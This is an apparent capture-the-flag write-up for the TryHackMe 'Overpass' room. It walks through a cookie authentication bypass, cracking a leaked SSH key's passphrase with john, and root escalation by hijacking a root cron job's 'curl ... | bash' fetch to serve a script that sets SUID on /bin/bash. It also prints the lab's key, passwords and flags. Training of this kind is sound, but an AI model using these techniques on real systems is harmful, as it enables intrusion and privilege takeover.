# TryHackMe [Overpass](https://tryhackme.com/room/overpass)
### References
* drd_. (2020, May 6). How to Crack SSH Private Key Passwords with John the Ripper. WonderHowTo; WonderHowTo. https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/
* Hammond, J. (2020). TryHackMe! Overpass - Authentication Bypass [YouTube Video]. In YouTube. https://youtu.be/NGNnxD0gNDw
## Reconnaissance
* `http://<MACHINE_IP>`:
```html
<p>Overpass allows you to securely store different
        passwords for every service, protected using military grade
        <!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
        cryptography to keep you safe.
</p>
```
* `http://<MACHINE_IP>/downloads/src/overpass.go`:
```go
//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
func rot47(input string) string {
	var result []string
	for i := range input[:len(input)] {
		j := int(input[i])
		if (j >= 33) && (j <= 126) {
			result = append(result, string(rune(33+((j+14)%94))))
		} else {
			result = append(result, string(input[i]))
		}
	}
```
```go
func main() {
	credsPath, err := homedir.Expand("~/.overpass")
	if err != nil {
		fmt.Println("Error finding home path:", err.Error())
	}
	//Load credentials
	passlist, status := loadCredsFromFile(credsPath)
	if status != "Ok" {
		fmt.Println(status)
		fmt.Println("Continuing with new password file.")
		passlist = make([]passListEntry, 0)
	}

	fmt.Println("Welcome to Overpass")

	//Determine function
	option := -1
	fmt.Print(
		"Options:\n" +
			"1\tRetrieve Password For Service\n" +
			"2\tSet or Update Password For Service\n" +
			"3\tDelete Password For Service\n" +
			"4\tRetrieve All Passwords\n" +
			"5\tExit\n")

	for option > 5 || option < 1 {
		optionString := input("Choose an option:\t")
		optionChoice, err := strconv.Atoi(optionString)
		if err != nil || optionChoice > 5 || optionChoice < 1 {
			fmt.Println("Please enter a valid number")
		}
		option = optionChoice
	}

	switch option {
	case 1:
		service := input("Enter Service Name:\t")
		getPwdForService(passlist, service)
	case 2:
		service := input("Enter Service Name:\t")
		newPwd := input("Enter new password:\t")
		passlist = setPwdForService(passlist, service, newPwd)
		saveCredsToFile(credsPath, passlist)
	case 3:
		service := input("Enter Service Name:\t")
		passlist, status := deletePwdByService(passlist, service)
		if status != "Ok" {
			fmt.Println(status)
		}
		saveCredsToFile(credsPath, passlist)
	case 4:
		printAllPasswords(passlist)
	}
}
```
* `http://<MACHINE_IP>/downloads/src/buildscript.sh`:
```bash
GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
echo "$(date -R) Builds completed" >> /root/buildStatus

```

```bash
$ ./overpassLinux
unexpected end of JSON input
Failed to load creds
Continuing with new password file.
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       2
Enter Service Name:     applegamer22
Enter new password:     applegamer22
$ ./overpassLinux
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       4
applegamer22     applegamer22
$ cat ~/.overpass
,LQ?2>6QiQ2AA=682>6CaaQ[QA2DDQiQ2AA=682>6CaaQN.
```
* User [dCode's ROT-47 decoder/encoder](https://www.dcode.fr/rot-47-cipher) to crack Overpass' encryption:
```json
[
	{
		"name":"applegamer22",
		"pass":"applegamer22"
	}
]
```
## Hack the machine and get the flag in `user.txt`
1. `gobuster`:
```bash
$ gobuster dir -u http://10.10.175.47 -w $(pwd)/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.175.47
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/applegamer22/Documents/CTFs/TryHackMe/Overpass/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/15 16:28:52 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]  
/admin                (Status: 301) [Size: 42] [--> /admin/]  
/css                  (Status: 301) [Size: 0] [--> css/]
```
2. `http://<MACHINE_IP>/login.js`:
```js
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
3. The JavaScript code above tells us that the website does not verify the value of the `SessionToken` cookie. If this cookie is set to any non-`null` value the website displays the following message:
> ### Welcome to the Overpass Administrator area
> A secure password manager with support for Windows, Linux, MacOS and more
> Since you keep forgetting your password, James, I've set up SSH keys for you.
>
>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
>Also, we really need to talk about this "Military Grade" encryption. - Paradox
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> Proc-Type: 4,ENCRYPTED
> DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
> 
> LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
> JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
> 73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
> WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
> BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
> AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
> 3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
> ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
> VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
> OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
> 9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
> eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
> 4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
> GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
> exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
> AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
> 6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
> dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
> n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
> 8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
> 4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
> ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
> 49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
> +hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
> 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
> -----END RSA PRIVATE KEY-----
> ```
4. Make a new `id_rsa` file for this RSA private key.
```bash
chmod 600 id_rsa
ssh -i id_rsa james@10.10.175.47
```
5. Convert the private to format readable by `john`:
```bash
$ ssh2john id_rsa > forjohn.txt
# if the default ssh2john crashes with 'AttributeError: module 'base64' has no attribute 'decodestring''
$ python ssh2john.py id_rsa > forjohn.txt
```
6. Crack the password with `john` and the `rockyou.txt` word list:
   * Assumed username is `james`
   * Cracked passphrase is `james13`
```bash
$ john --wordlist=$(pwd)/rockyou.txt forjohn.txt
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)
1g 0:00:00:02 DONE (2021-04-17 11:36) 0.4149g/s 5950Kp/s 5950Kc/s 5950KC/s  0 0 0..*7¡Vamos!
Session completed
```
1. Login via `ssh` and passphrase `james13` and retrieve `user.txt`:
```bash
$ ssh -i id_rsa james@<MACHINE_IP>
james@overpass-prod:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
```

**Answer**: `thm{65c1aaf000506e56996822c6281e6bf7}`
## Escalate your privileges and get the flag in `root.txt`
1. Check for James' `.overpass` ROT47 hash:
```bash
$ cat .overpass 
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```
2. Use [dCode's ROT-47 decoder/encoder](https://www.dcode.fr/rot-47-cipher) to crack Overpass' encryption:
```json
[
	{
		"name":"System",
		"pass":"saydrawnlyingpicture"
	}
]
```
3. The `root` user performs a custom CronJob:
```bash
james@overpass-prod:~$ cat /etc/crontab 
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
4. `overpass.thm` is mapped to `127.0.0.1`:
```bash
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 overpass.thm
```
5. Modify `/etc/hosts` so `overpass.thm` is mapped to your TryHackMe IP address (green bubble on the navbar).
6. Make a new `buildscript.sh` on your local machine on `mkdir -p downloads/src/`:
```bash
#!/bin/bash
chmod +s /bin/bash
```
7. Start a web server on the same directory as your `downloads` directory:
```bash
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.169.242 - - [17/Apr/2021 12:13:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```
8. Wait for a minute or untill `/bin/bash` has the permission `-rwsr-sr-x`
```bash
james@overpass-prod:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```
9. On the server, use privilege escalation to read `root.txt`:
```bash
james@overpass-prod:~$ /bin/bash -p
bash-4.4# cat /root/root.txt 
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

**Answer**: `thm{7f336f8c359dbac18d54fdd64ea753bb}`